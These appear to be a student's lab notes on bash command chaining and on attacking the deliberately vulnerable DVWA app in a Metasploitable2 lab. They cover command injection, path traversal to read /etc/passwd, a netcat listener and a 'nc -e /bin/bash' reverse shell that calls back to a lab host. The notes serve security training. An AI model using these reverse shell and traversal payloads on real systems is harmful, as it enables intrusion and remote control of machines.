## Overview
- Talked about chaining commands ( using ; or | )

Ex: `ping -c 3 8.8.8.8; ip a`

The above command pings the 8.8.8.8 address 3 times, and then executes the `ip a` command

( || basically means that if the first command fails, it will do what is after the ||)

Ex: `ping -c 3 blabla || whoami`

- This will first ping a certain IP address 3 times, but of course, blabla is not an IP address, so the second command `whoami` will be executed.

## Command Execution
- Set security level of DVWA to low (at Metasploitable instance) 
The security level of the DVWA site emulates the amount of protections put in place to make a web app secure.

- `&&` implies that only if the first command succeeds, the second will run.
- Think of `&&` and `||` as opposites.

- `&` runs the first command in the background so you can still have terminal access.

- `for i in $(ls); do ls -a; done`

- This command uses`$()` to invoke bash scripting.

- Talked about POSIX standards; something under this standard will work on **any** UNIX machine.

Everything we talked about in the realm of command symbols:

`; | || & && $() ``

These are all ways to chain commands.


- We now started working under the 'Command Execution' tab on DVWA.


 Here, we basically used command chaining to exploit this vulnerable input field to have unsanitized command input be run.

 NOTE: after changing the DVWA security level to medium, we can see that the command chaining vulnerability no longer works! The application now seems to be sanitizing/filtering out chaining symbols such as |, ||, &, &&...

- If we click 'View Source' we can see that the previous command execution vulnerability is being accounted for by converting entered chaining symbols (`&& | ||...` ) into nothing (just `''`).

### Setting up Reverse Shell using Command Execution Page

- Using Netcat here

- Remember, we must set a listener and connector

`sudo nc -nvlp 80`

^Setup listener with that command

- Now we entered reverse shell  commands through the unsanitized input field on DVWA. (any commands entered on DVWA are executed on our Metasploitable2 instance).

- We used python today to make our shell information clearer to us.

![[Pasted image 20220216183315.png]]

Woah look how sick that is we just got a connection to our listening machine through the DVWA command execution page. 

This was possible through command chaining; the page didn't fully sanitize out `|` inputs in the field.

Its way too common that web developers do not sanitize their input fields for command/code injection vulnerabilities.

## File Inclusion

- First we copy the entire URL of the File Inclusion tab 

	`curl`

	`sudo apt update && sudo apt install curl -y`


`192.168.169.129/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd`

by typing this into the search bar and change the 'page=' direct to a combination of ../ followed by *etc/passwd* , we  are trying to backtrack across all directories of this webpage, so we can then navigate to the directory (etc/passwd) that can be expected to hold passwords that we shouldn't be able to be seeing.


- Bash is the programming language that every terminal uses.

## Connecting to listening port using netcat

- `nc -e /bin/bash 192.168.133.129 80`


### Using Python to Upgrade a Shell (Spawn a Better Shell)

- `python -c "import pty; pty.spawn('/bin/bash');"`


**Changing environment variables permanently:**

From home directory:
`ls -la`

Followed by:
`nano .bashrc`

